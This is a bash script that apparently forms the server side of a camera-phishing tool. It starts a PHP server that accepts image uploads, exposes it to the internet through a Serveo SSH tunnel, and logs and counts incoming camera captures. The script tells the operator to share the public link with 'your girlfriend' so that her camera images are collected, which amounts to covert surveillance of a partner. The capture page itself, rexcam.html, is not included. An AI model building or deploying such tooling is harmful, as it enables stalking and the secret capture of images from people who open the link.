#!/bin/bash

echo "🌐 Long Distance Camera Capture System"
echo "========================================"
echo "🔧 Using Serveo.net for public access"

# Check dependencies
check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo "❌ $1 not found. Installing..."
        pkg install -y $2
    fi
}

check_dependency "php" "php"
check_dependency "ssh" "openssh"

# Create directory for captured images
mkdir -p cam_captures
echo "📁 Capture directory: $(pwd)/cam_captures"

# Create the PHP server file
cat > server.php << 'EOF'
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST");
header("Access-Control-Allow-Headers: Content-Type");

// Create captures directory if it doesn't exist
if (!is_dir('cam_captures')) {
    mkdir('cam_captures', 0777, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $uploadDir = 'cam_captures/';
    $timestamp = time();
    $filename = "capture_{$timestamp}_" . uniqid() . ".jpg";
    $uploadFile = $uploadDir . $filename;
    
    if (move_uploaded_file($_FILES['image']['tmp_name'], $uploadFile)) {
        file_put_contents('log.txt', date('Y-m-d H:i:s') . " - Capture saved: $filename\n", FILE_APPEND);
        echo "SUCCESS:$filename";
    } else {
        echo "ERROR:Failed to save file";
    }
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/status') {
    echo "SERVER_ACTIVE:" . date('Y-m-d H:i:s');
} else if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/count') {
    $files = glob('cam_captures/*.jpg');
    echo "TOTAL_CAPTURES:" . count($files);
} else {
    // Serve the HTML file
    readfile('rexcam.html');
}
EOF

echo "🚀 Starting PHP server on port 8080..."
php -S 127.0.0.1:8080 server.php &
SERVER_PID=$!
sleep 3

echo "🌐 Creating Serveo tunnel..."
echo "⏳ This may take a few seconds..."

# Try to create Serveo tunnel with random subdomain
SERVEO_URL=""
for i in {1..5}; do
    echo "Attempt $i to create tunnel..."
    SERVEO_OUTPUT=$(ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:8080 serveo.net 2>&1 &)
    SERVEO_PID=$!
    sleep 8
    
    # Get the Serveo URL from logs
    SERVEO_URL=$(echo "$SERVEO_OUTPUT" | grep -oE 'https://[a-zA-Z0-9]+\.serveo\.net' | head -n1)
    
    if [ ! -z "$SERVEO_URL" ]; then
        break
    fi
    
    # Kill the previous ssh process if it failed
    kill $SERVEO_PID 2>/dev/null
    sleep 2
done

if [ -z "$SERVEO_URL" ]; then
    echo "❌ Failed to get Serveo URL. Trying manual method..."
    # Alternative method
    SERVEO_URL=$(ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:8080 serveo.net 2>&1 | grep -oE 'https://[a-zA-Z0-9]+\.serveo\.net' | head -n1) &
    SERVEO_PID=$!
    sleep 10
fi

if [ ! -z "$SERVEO_URL" ]; then
    echo "✅ Public URL: $SERVEO_URL"
    echo "🔗 Share this link with your girlfriend anywhere in the world!"
    echo "$SERVEO_URL" > serveo_url.txt
else
    echo "❌ Serveo tunnel failed. Starting local server only."
    LOCAL_IP=$(ifconfig | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
    if [ ! -z "$LOCAL_IP" ]; then
        echo "📱 Local URL: http://$LOCAL_IP:8080"
    else
        echo "📱 Local URL: http://127.0.0.1:8080"
    fi
fi

echo ""
echo "📊 Monitoring captures..."
echo "💡 Press Ctrl+C to stop"
echo "🕒 Server started at: $(date)"

# Function to monitor captures
monitor_captures() {
    echo "👀 Starting capture monitor..."
    while true; do
        if inotifywait -e create cam_captures/ 2>/dev/null; then
            latest_file=$(ls -t cam_captures/*.jpg 2>/dev/null | head -n1)
            if [ ! -z "$latest_file" ]; then
                filename=$(basename "$latest_file")
                echo "✅ Cam file received: $filename ($(date '+%H:%M:%S'))"
                echo "📁 Total captures: $(ls -1 cam_captures/*.jpg 2>/dev/null | wc -l)"
            fi
        fi
        sleep 1
    done
}

# Start monitoring in background
monitor_captures &
MONITOR_PID=$!

# Function to show status
show_status() {
    total_captures=$(ls -1 cam_captures/*.jpg 2>/dev/null | wc -l)
    echo ""
    echo "=== SYSTEM STATUS ==="
    echo "📸 Total captures: $total_captures"
    echo "🌐 Public URL: ${SERVEO_URL:-Not available}"
    echo "🕒 Uptime: $(date)"
    echo "====================="
}

# Cleanup on exit
cleanup() {
    echo ""
    echo "🛑 Stopping services..."
    kill $SERVER_PID 2>/dev/null
    kill $SERVEO_PID 2>/dev/null
    kill $MONITOR_PID 2>/dev/null
    echo "✅ Services stopped"
    exit 0
}

trap cleanup SIGINT

# Show status every 30 seconds
while true; do
    show_status
    sleep 30
done